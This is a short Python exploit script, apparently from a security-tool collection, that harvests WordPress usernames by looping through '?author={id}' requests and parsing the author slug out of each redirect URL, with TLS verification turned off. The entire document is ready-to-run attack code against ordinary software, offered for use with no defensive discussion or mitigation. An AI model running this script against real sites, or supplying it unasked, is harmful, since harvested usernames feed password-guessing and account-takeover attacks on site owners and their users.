############################################################################################
# title         : Wordpress User Enumeration
# CVE           : -
# description   : User Enumeration attack throught the Wordpress's parameter "?author={id}"
# author        : Leo Depriester <leo.depriester@exadot.fr>
# date          : 2016/10/15
# version       : 1.0
############################################################################################
import requests, re
class Exploit:
    
    @staticmethod
    def run(): 
        # Define host
        host = raw_input("Host [https://example.tld/] : ")
        if not host:
            host = "https://example.tld/"
        Exploit.exploit(host)   
    
    @staticmethod
    def exploit(host):
        requests.packages.urllib3.disable_warnings()
        if host[-1:] != "/":
            host = host+"/"
        r = requests.get(host, verify=False)
        if r.status_code != 200:
            print "[-] Something goes wrong. HTTP status code : %s" % r.status_code
            exit(1)
        i = 0
        print "[*] Starting enumeration ..."
        while True:
            i += 1
            r = requests.get(host+"?author="+str(i), verify=False)
            code = r.status_code
            if code == 404:
                break
            else:
                m = re.search("author\/(.*)", r.url)
                if m is None:
                    print "[-] The target is not vulnerable to user enumeration."
                    break
                author = m.group(1)
                if author[-1:] == "/":
                    author = author[:-1]
                print "[+] User found : %s" % author

